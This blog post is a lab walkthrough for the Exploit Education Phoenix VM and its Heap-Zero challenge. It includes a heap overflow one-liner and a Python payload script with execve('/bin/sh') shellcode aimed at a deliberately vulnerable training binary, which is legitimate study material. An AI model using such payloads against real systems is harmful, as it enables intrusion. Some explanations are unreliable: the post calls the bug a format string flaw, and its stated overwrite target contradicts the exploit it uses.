---
layout: phoenix
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Heap-Zero:

**Challenge**: [Phoenix/Heap-Zero](https://exploit.education/phoenix/heap-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Quick History

From [Wikipedia](https://en.wikipedia.org/wiki/Heap_overflow):

> *A heap overflow, heap overrun, or heap smashing is a type of `buffer overflow` that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list `pointers`. The canonical heap overflow technique overwrites `dynamic memory allocation linkage` (such as `malloc` metadata) and uses the resulting pointer exchange to overwrite a program `function pointer`.*

⚡ **Takeaway**:  You can corrupt heap-managed metadata or adjacent `heap` data (like a function pointer) to change `program control flow`.

---

## Starting the Challenge

![binary-start](/assets/phoenix-heap/welcome.png)



At the start, we see:

```
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwritten
```

Clearly, our mission is to *overflow* the`function pointer`. 🚩


nm ./heap-zero

```
08049068 t sYSTRIm
         U sbrk
0804c2c4 B stderr
0804c2c0 B stdout
         U strcpy
         U sysconf
0804a7b0 T valloc
08048835 T winner
```

we see a winner `08048835` function,

yes, this is the thing we need to call,

```
(gdb) disassemble winner
Dump of assembler code for function winner:
   0x08048835 <+0>:     push   %ebp
   0x08048836 <+1>:     mov    %esp,%ebp
   0x08048838 <+3>:     sub    $0x8,%esp
   0x0804883b <+6>:     sub    $0xc,%esp
   0x0804883e <+9>:     push   $0x804abd0
   0x08048843 <+14>:    call   0x8048600 <puts@plt>
   0x08048848 <+19>:    add    $0x10,%esp
   0x0804884b <+22>:    nop
   0x0804884c <+23>:    leave
   0x0804884d <+24>:    ret
End of assembler dump.
(gdb) x/s 0x804abd0
0x804abd0:      "Congratulations, you have passed this level"
(gdb)

```

---

## Strategy

Here, its calling some address `0x804abd0`, lets add some 72 bytes worth of buffer?

So, the disassembly will give us what code is exactly doing i.e. number of byte allocation in malloc,

We’ll need to:

* our base address is 0xf7e69008.
* our target address is 0xf7e69050.
* We need to just overflow it with 0x804abd0.
* substracting the address we get 72 bytes.
 

`payload` is like `72*A + 0x804abd0`

---
## Exploit

writing out our exploit:

```
./heap-zero "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x35\x88\x04\x08')")" 
```

![passed](/assets/phoenix-heap/passed.png)

---

## Injecting Shellcode

On amd64 we ran into problems with NUL (`\x00`) and newline (`\x0a`) bytes when trying to place raw addresses into argv. Important constraints:

* `argv[]` entries are C strings and **cannot contain NUL** bytes dur to `strcpy()`.
* Shell command substitution and quoting can be broken by newlines or unescaped bytes.

script:

```
import struct

address = struct.pack('Q',0x7fffffffeec1-20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)

```

Because of those constraints, you used a **shellcode injection + return address** approach on amd64.

---

## amd64 shellcode-style exploit (script used)

Replace the address with the exact address observed in gdb.

```python
#!/usr/bin/env python3
import struct

# pick the address you saw in gdb where the shellcode/buffer will reside
# example: 0x7fffffffeec1 - 20
address = struct.pack('Q', 0x7fffffffeec1 - 20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)
```

> Note: replace `0x7fffffffeec1-20` with the exact address you verified in gdb. In GDB I got buffer around 0xeec1 by observing sp and ip, I decremented the address by 20 bytes.

* NOP sled (0x90s)
* execve("/bin/sh") shellcode
* padding up to the saved RIP overwrite
* 8-byte little-endian return address (to jump into the NOP/shellcode area)

Write the payload to a file and use it in gdb:

```bash
python3 /tmp/qaz.py > /tmp/payload.bin
gdb --args ./heap-zero zero
# inside gdb:
(gdb) run < /tmp/payload.bin
```

Or, if the program opens the filename passed in argv:

```bash
./heap-zero $(python /tmp/qaz.py)
```
![alt text](/assets/phoenix-heap/image-2.png)

---

## Recommendations / debugging tips

* Use gdb to confirm layout:

  * `info registers rip rsp rbp`
  * `x/256bx <buffer_address>`
  * `x/4gx $rbp`       (view saved rbp and saved rip if frame pointers used)
  * `x/10i <buffer_address>` (disassemble where you will land)
  * `info proc mappings` (check NX/permissions)

* If you see decoder junk like `rex.X` when disassembling, it usually means you returned into ASCII bytes (`0x40`–`0x4f` are REX prefixes). Fix by placing a NOP sled (`0x90`) before the shellcode or ensure the return address points to a valid opcode.

* **Argv cannot contain NUL bytes.** To pass binary data with NULs use:

  * a temporary file and pass its filename
  * stdin (pipe or redirection)
  * process substitution (`/dev/fd/N`) or FIFO

* Use little-endian packing for addresses:

  * 32-bit: `struct.pack("<I", addr)`
  * 64-bit: `struct.pack("<Q", addr)`

* For realistic targets prefer ROP / ret2libc where NX is enabled. On this host `checksec` showed NX disabled and RWX segments present, which allowed stack/heap shellcode execution.

---

